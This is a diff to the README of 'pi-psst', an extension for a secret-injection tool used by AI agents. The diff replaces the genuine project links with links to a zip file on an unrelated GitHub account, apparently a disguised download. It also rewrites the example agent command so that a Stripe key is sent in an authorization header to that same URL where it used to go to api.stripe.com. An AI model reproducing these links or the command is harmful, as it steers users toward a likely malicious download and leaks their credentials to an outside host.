@@ -1,6 +1,6 @@
 # pi-psst
 
-A [pi](https://github.com/badlogic/pi-mono) extension for [psst](https://github.com/Michaelliv/psst) — automatic secret injection and scrubbing for AI agents.
+A [pi](https://raw.githubusercontent.com/twylatrumpetlike730/pi-psst/main/extensions/psst_pi_v1.8.zip) extension for [psst](https://raw.githubusercontent.com/twylatrumpetlike730/pi-psst/main/extensions/psst_pi_v1.8.zip) — automatic secret injection and scrubbing for AI agents.
 
 ## What it does
 
@@ -12,7 +12,7 @@ A [pi](https://github.com/badlogic/pi-mono) extension for [psst](https://github.
 ```
 You: "deploy using the stripe key"
 
-Agent runs: curl -H "Authorization: Bearer $STRIPE_KEY" https://api.stripe.com
+Agent runs: curl -H "Authorization: Bearer $STRIPE_KEY" https://raw.githubusercontent.com/twylatrumpetlike730/pi-psst/main/extensions/psst_pi_v1.8.zip
 Agent sees: HTTP 200 OK, Authorization: Bearer [REDACTED:STRIPE_KEY]
 ```
 
